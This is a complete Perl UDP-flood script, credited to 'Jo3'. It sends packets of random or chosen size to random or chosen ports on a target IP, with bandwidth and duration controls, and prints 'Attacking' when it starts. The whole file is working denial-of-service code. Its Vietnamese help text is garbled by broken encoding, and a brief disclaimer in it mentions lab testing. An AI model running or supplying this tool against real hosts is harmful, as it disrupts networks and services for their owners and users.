#!/usr/bin/perl
#####################################################
# udp flood - Coded By Jo3
######################################################
 
use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;
 
our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;
 
GetOptions(
        "port=i" => \$port,             # UDP port to use, numeric, 0=random
        "size=i" => \$size,             # packet size, number, 0=random
        "bandwidth=i" => \$bw,          # bandwidth to consume
        "time=i" => \$time,             # time to run
        "delay=f"=> \$delay,            # inter-packet delay
        "help|?" => \$help);            # help
       
 
my ($ip) = @ARGV;
 
if ($help || !$ip) {
  print <<'EOL';
flood.pl --port=dst-port --size=pkt-size --time=secs
         --bandwidth=kbps --delay=msec ip-address
_______________________________________________________________________________________________ | =>
Ti�u chu?n:
���* UDP ��ch ng?u nhi�n ��?c s? d?ng tr? khi --port �?nh
���* G�i k�ch th�?c ng?u nhi�n ��?c g?i tr? khi --size ho?c --bandwidth ��?c quy �?nh
���* L? l?t li�n t?c tr? tr�?ng h?p quy �?nh --time
���* L? s? ��?c g?i �?n m?t t?c �? d?ng, tr? khi n� ��?c ch? �?nh ho?c --delay --bandwidth
_______________________________________________________________________________________________ | =>
Khuy?n c�o s? d?ng:
���tham s? --size ��?c b? qua n?u c? --bandwidth v� --delay
�����c�c th�ng s? ��?c quy �?nh.
_______________________________________________________________________________________________ | =>
���K�ch th�?c g�i ��?c thi?t l?p �?n 256 byte, n?u tham s? ��?c s? d?ng --bandwidth
�����m� kh�ng --size tham s?
_______________________________________________________________________________________________ | =>
���C�c k�ch th�?c c?a g�i �?nh l� k�ch th�?c IP datagram (IP v� bao g?m
���Ti�u �? UDP). K�ch th�?c giao di?n g�i c� th? thay �?i t�y theo l?p 2 ��?ng h?m.
_______________________________________________________________________________________________ | =>
C?nh b�o v� Mi?n tr?:
���Host l? l?t ho?c c�c m?ng b�n th? ba th�?ng ��?c coi l� m?t ho?t �?ng t?i ph?m.
���L? l?t m�y ho?c c�c m?ng ri�ng c?a h? n�i chung l� m?t ? t�?ng t?i
���Gi?i ph�p l? performace cao n�n ��?c s? d?ng cho c�ng th?ng / th? nghi?m hi?u su?t
���S? d?ng ch? y?u trong m�i tr�?ng ph?ng th� nghi?m �? th? nghi?m DoS
______________________________________________________________________
EOL
  exit(1);
}
 
if ($bw && $delay) {
  print "AVISO: calculado tamanho do pacote substitui o par�metro --size ignorado\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}
 
$size = 256 if $bw && !$size;
 
($bw = int($size / $delay * 8)) if ($delay && $size);
 
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "N?o pode resolver o nome do host $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print "Attacking$ip " . ($port ? $port : "acaso") . " porta com " .
  ($size ? "$size-byte" : "tamanho aleat�rio") . " pacotes" . ($time ? " for $time seconds" : "") . "\n";
print "GHT $delay msec\n" if $delay;
print "dang tan cong\n" if $bw;
print "code by Jo3\n" unless $time;
 
die "Invalid packet size requested: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
}